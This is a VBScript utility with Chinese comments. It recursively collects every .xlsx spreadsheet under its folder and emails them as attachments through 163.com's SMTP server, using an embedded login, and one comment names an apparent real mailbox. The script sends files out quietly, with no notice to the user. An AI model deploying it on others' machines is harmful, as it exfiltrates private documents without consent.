NameSpace = "http://schemas.microsoft.com/cdo/configuration/" '这个必须有，应该是VBS脚本链接微软网站获取某些支持应用的，删除的话vbs脚本会报错！

Dim oFSO, oFolder,oSubFolders, oSubFolder, oFiles, oFile
Dim OutputLog,strPathName
strPathName = createobject("Scripting.FileSystemObject").GetFolder(".").Path
Dim DirArray(1000)
Dim DirNum:DirNum = -1
Dim FileName
TranverseFile(strPathName)
Function TranverseFile(strPathName)
	Set oFSO = CreateObject("scripting.filesystemobject")
	Set oFolder = oFSO.GetFolder(strPathName)
	Set oFiles = oFolder.Files
	
	'Tranverse every file in the specified file path and 
	'record the file path to the log.txt file.
	For Each oFile In oFiles
		If StrComp(LCase(oFSO.GetExtensionName(oFile)),"xlsx")=0 And DirNum <= 1000 Then
			DirNum = DirNum + 1
			DirArray(DirNum) = oFile.Path
		End If 
	Next
	
	Set oSubFolders = oFolder.subfolders
	
	'Recurse the subFolder
	For Each oSubFolder In oSubFolders
		TranverseFile(oSubFolder)
	Next 
	
	Set oFSO = Nothing
	Set oFolder = Nothing 
	Set oSubFolders = Nothing 
	Set oSubFolder = Nothing 
	Set oFiles = Nothing 
	Set oFile = Nothing 
End Function


set Email = CreateObject("CDO.Message")'调用vbs邮件接口
Email.From = "xxxx@163.com"
Email.To = "xxxx@163.com"
Email.Textbody = "kong"
with Email.Configuration.Fields
.Item(NameSpace&"sendusing") = 2
.Item(NameSpace&"smtpserver") = "smtp.163.com" '这是163邮箱服务器地址，qq邮箱等请自行填写smtp地址
.Item(NameSpace&"smtpserverport") = 25
.Item(NameSpace&"smtpauthenticate") = 1
.Item(NameSpace&"sendusername") = "xxxx" '发信人用户名
.Item(NameSpace&"sendpassword") = "****" '发信人密码，也就是ksfer124@163.com的邮箱密码！
.Update
end with

if DirNum > -1 Then
	For i = 0 To DirNum
		Email.AddAttachment DirArray(i)
	Next
End If
Email.Send
Set Email=Nothing
Set DirNum = Nothing 